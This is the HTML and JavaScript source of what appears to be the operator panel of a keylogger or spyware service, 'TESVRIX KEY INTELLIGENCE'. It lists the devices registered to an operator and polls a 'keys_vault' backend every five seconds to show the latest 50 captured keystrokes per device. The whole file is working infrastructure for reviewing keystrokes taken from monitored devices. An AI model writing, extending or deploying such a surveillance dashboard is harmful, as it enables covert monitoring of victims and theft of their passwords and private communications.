<!DOCTYPE html>
<html lang="en">
<head>
    <script src="../protect.js"></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TESVRIX � KEY INTELLIGENCE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #e11d48;
            --bg: #020617;
            --surface: #0f172a;
            --text: #f1f5f9;
        }

        body {
            background: var(--bg);
            color: var(--text);
            font-family: 'Plus Jakarta Sans', sans-serif;
            padding: 20px;
        }

        .container { max-width: 900px; margin: 0 auto; }

        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            padding: 20px;
            background: var(--surface);
            border: 1px solid rgba(225, 29, 72, 0.3);
            border-radius: 15px;
        }

        .header h2 {
            font-family: 'Orbitron', sans-serif;
            font-size: 1rem;
            color: var(--primary);
            letter-spacing: 2px;
        }

        .key-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .key-item {
            background: var(--surface);
            padding: 15px 20px;
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            display: flex;
            justify-content: space-between;
            align-items: center;
            animation: fadeIn 0.3s ease-out;
        }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .key-content {
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            color: #fff;
            font-size: 1.1rem;
            letter-spacing: 1px;
        }

        .key-time {
            font-size: 0.7rem;
            color: #64748b;
            font-weight: 600;
        }

        .refresh-btn {
            background: var(--primary);
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            cursor: pointer;
            transition: 0.3s;
        }
        .refresh-btn:hover { background: #f43f5e; }

        #deviceList {
            background: #000;
            color: #fff;
            border: 1px solid var(--primary);
            padding: 5px 15px;
            border-radius: 5px;
            outline: none;
        }

    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2><i class="fas fa-keyboard"></i> KEY LOGS (LATEST 50)</h2>
            <select id="deviceList"></select>
            <button class="refresh-btn" onclick="fetchKeys()"><i class="fas fa-sync"></i> REFRESH</button>
        </div>

        <div id="keyList" class="key-list">
            <div style="text-align: center; color: #475569; padding: 40px;">
                <i class="fas fa-spinner fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
                <p>LOADING KEY INTELLIGENCE...</p>
            </div>
        </div>
    </div>

    <script src="../davidkewebsitekemake300kespeedma/config.php"></script>
    <script>
        const auth = JSON.parse(localStorage.getItem('user') || '{}');
        let targetUuid = null;

        async function fetchDevices() {
            try {
                const r = await fetch(getApiUrl(`devices?operator_id=eq.${auth.operator_id}&order=last_seen.desc`), {
                    headers: getApiHeaders()
                });
                const data = await r.json();
                const sel = document.getElementById('deviceList');
                sel.innerHTML = data.map(d => `<option value="${d.device_uuid}">${d.device_name || 'NODE'}</option>`).join('');
                if (data[0]) {
                    targetUuid = data[0].device_uuid;
                    fetchKeys();
                }
            } catch (e) {}
        }

        document.getElementById('deviceList').onchange = (e) => {
            targetUuid = e.target.value;
            fetchKeys();
        };

        async function fetchKeys() {
            if (!targetUuid) return;
            try {
                const r = await fetch(getApiUrl(`keys_vault?device_uuid=eq.${targetUuid}&order=created_at.desc&limit=50`), {
                    headers: getApiHeaders()
                });
                const data = await r.json();
                const list = document.getElementById('keyList');

                if (data.length === 0) {
                    list.innerHTML = '<div style="text-align: center; color: #475569; padding: 40px;">NO KEYS CAPTURED YET</div>';
                    return;
                }

                list.innerHTML = data.map(k => `
                    <div class="key-item">
                        <div class="key-content">${escapeHtml(k.key_data)}</div>
                        <div class="key-time">${new Date(k.created_at).toLocaleString()}</div>
                    </div>
                `).join('');
            } catch (e) {}
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        fetchDevices();
        setInterval(fetchKeys, 5000); // Auto-refresh every 5s
    </script>
</body>
</html>
